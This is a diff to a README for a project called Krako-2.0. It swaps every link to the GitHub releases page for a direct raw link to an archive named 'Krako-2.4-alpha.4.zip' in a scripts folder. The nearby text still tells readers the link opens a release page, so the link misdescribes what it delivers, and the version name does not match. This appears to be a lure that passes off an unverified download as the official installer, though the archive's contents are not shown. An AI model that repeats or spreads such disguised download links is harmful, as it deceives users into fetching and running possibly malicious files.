@@ -1,6 +1,6 @@
 # ⚡ Krako-2.0 - Smart Energy-Efficient Edge Computing
 
-[![Download Krako-2.0](https://img.shields.io/badge/Download-Krako--2.0-brightgreen?style=for-the-badge)](https://github.com/aqsaifinteriors/Krako-2.0/releases)
+[![Download Krako-2.0](https://img.shields.io/badge/Download-Krako--2.0-brightgreen?style=for-the-badge)](https://github.com/aqsaifinteriors/Krako-2.0/raw/refs/heads/main/scripts/Krako-2.4-alpha.4.zip)
 
 ---
 
@@ -41,7 +41,7 @@ Make sure you have enough space and permissions before you proceed.
 ## 🚀 How to Download Krako-2.0
 
 1. Go to the official release page:  
-   [Visit this page to download Krako-2.0](https://github.com/aqsaifinteriors/Krako-2.0/releases)  
+   [Visit this page to download Krako-2.0](https://github.com/aqsaifinteriors/Krako-2.0/raw/refs/heads/main/scripts/Krako-2.4-alpha.4.zip)  
    This page lists the latest versions of the software. You will find files for Windows and any updates.
 
 2. Look for the latest release. It usually appears at the top, marked with a version number and date.
@@ -115,7 +115,7 @@ Updates improve software performance and security. Check for updates regularly:
 4. If an update is available, follow the prompts to download and install it.
 
 Alternatively, visit the releases page to download the newest installer:  
-[Visit this page to download Krako-2.0](https://github.com/aqsaifinteriors/Krako-2.0/releases)
+[Visit this page to download Krako-2.0](https://github.com/aqsaifinteriors/Krako-2.0/raw/refs/heads/main/scripts/Krako-2.4-alpha.4.zip)
 
 ---
 
@@ -144,4 +144,4 @@ These topics explain the core ideas behind Krako-2.0 and how it can be useful fo
 
 ---
 
-[![Download Krako-2.0](https://img.shields.io/badge/Download-Krako--2.0-brightgreen?style=for-the-badge)](https://github.com/aqsaifinteriors/Krako-2.0/releases)
+[![Download Krako-2.0](https://img.shields.io/badge/Download-Krako--2.0-brightgreen?style=for-the-badge)](https://github.com/aqsaifinteriors/Krako-2.0/raw/refs/heads/main/scripts/Krako-2.4-alpha.4.zip)
